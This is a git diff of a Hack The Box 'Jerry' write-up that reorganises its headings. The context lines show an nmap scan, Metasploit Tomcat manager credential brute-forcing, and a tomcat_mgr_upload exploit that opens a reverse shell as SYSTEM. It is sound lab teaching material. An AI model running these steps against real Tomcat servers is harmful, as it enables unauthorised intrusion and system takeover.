@@ -14,13 +14,15 @@ image: ./assets/cover.png
 difficulty: Very Easy
 ---
 
-## Port scanning
+## Reconnaissance
+
+### Port Scanning
 
 
 The first step is to identify which services are exposed on the target. A full TCP scan helps determine the attack surface before any deeper inspection.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/windows/Jerry]
 └──╼ $ sudo nmap -sC -sV -p- -T4 --min-rate 1000 -oN nmap/tcp_scan 10.129.136.9
 # Nmap 7.95 scan initiated Sun Aug 30 16:47:25 2026 as: nmap -sC -sV -p- -T4 --min-rate 1000 -oN nmap/tcp_scan 10.129.136.9
 Nmap scan report for 10.129.136.9
@@ -37,7 +39,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 ```
 The scan shows only one port is up and it is running Apache Tomcat 7.0.88.
 
-## Credential enumeration
+## Exploitation
+
+### Tomcat Credential Enumeration
 
 using the **auxiliary/scanner/http/tomcat_mgr_login** module in Metasploit, we can enumerate the credentials for the Tomcat manager application.
 
@@ -55,7 +59,7 @@ we got access credentials
 
 then we can use the **exploit/multi/http/tomcat_mgr_upload** module to get a reverse shell on the target machine.
 
-## Shell as nt authority\system
+## Shell as `NT AUTHORITY\SYSTEM`
 ```bash
 msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> run 
 [*] Started reverse TCP handler on 10.10.15.47:4444 
